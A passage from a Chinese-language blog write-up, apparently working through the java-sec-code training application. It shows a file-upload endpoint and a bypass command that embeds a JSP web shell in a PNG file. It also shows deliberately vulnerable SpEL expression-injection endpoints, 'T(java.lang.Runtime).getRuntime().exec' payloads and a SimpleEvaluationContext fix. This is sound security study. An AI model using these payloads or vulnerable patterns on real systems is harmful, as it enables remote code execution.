class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload/picture&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">    if (multifile.isEmpty()) &#123;</span><br><span class="line">        return &quot;Please select a file to upload&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String fileName = multifile.getOriginalFilename();</span><br><span class="line">    String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名</span><br><span class="line">    String mimeType = multifile.getContentType(); // 获取MIME类型</span><br><span class="line">    String filePath = UPLOADED_FOLDER + fileName;</span><br><span class="line">    File excelFile = convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 判断文件后缀名是否在白名单内  校验1</span><br><span class="line">    String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">    boolean suffixFlag = false;</span><br><span class="line">    for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">        if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">            suffixFlag = true;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!suffixFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 判断MIME类型是否在黑名单内 校验2</span><br><span class="line">    String[] mimeTypeBlackList = &#123;</span><br><span class="line">            &quot;text/html&quot;,</span><br><span class="line">            &quot;text/javascript&quot;,</span><br><span class="line">            &quot;application/javascript&quot;,</span><br><span class="line">            &quot;application/ecmascript&quot;,</span><br><span class="line">            &quot;text/xml&quot;,</span><br><span class="line">            &quot;application/xml&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">        // 用contains是为了防止text/html;charset=UTF-8绕过</span><br><span class="line">        if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">            logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 判断文件内容是否是图片 校验3</span><br><span class="line">    boolean isImageFlag = isImage(excelFile);</span><br><span class="line">    deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">    if (!isImageFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = multifile.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#x27;%s&#x27;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>判断为图片才允许上传，不过仍可通过其他方式绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/shell.jsp muma.png</span><br></pre></td></tr></table></figure>

<h3 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p>
<p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code></p>
<h4 id="1-spel-vuln1"><a href="#1-spel-vuln1" class="headerlink" title="1.&#x2F;spel&#x2F;vuln1"></a>1.&#x2F;spel&#x2F;vuln1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="line"> public String spel_vuln1(String value) &#123;</span><br><span class="line">     ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">     return parser.parseExpression(value).getValue().toString();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以通过spel表达式实现命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="2-spel-vuln2"><a href="#2-spel-vuln2" class="headerlink" title="2.&#x2F;spel&#x2F;vuln2"></a>2.&#x2F;spel&#x2F;vuln2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="line">    public String spel_vuln2(String value) &#123;</span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">        Object x = expression.getValue(context);    // trigger vulnerability point</span><br><span class="line">        return x.toString();   // response</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>比第一关多了一个模板引擎，用#{}套上就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/sec&quot;)</span><br><span class="line">  public String spel_sec(String value) &#123;</span><br><span class="line">      SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">      SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">      Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">      Object x = expression.getValue(context);</span><br><span class="line">      return x.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinseyy.github.io/2025/06/26/java-sec-code/" title="java-sec-code">https://kinseyy.github.io/2025/06/26/java-sec-code/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/07/07/Javaweb/" rel="prev" title="Javaweb"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Javaweb</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/06/24/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="ctfshow-文件上传"><span class="post-nav-text">ctfshow-文件上传</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinseyy/kinseyy.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2025/06/26/java-sec-code/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinseyy" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script></body></html>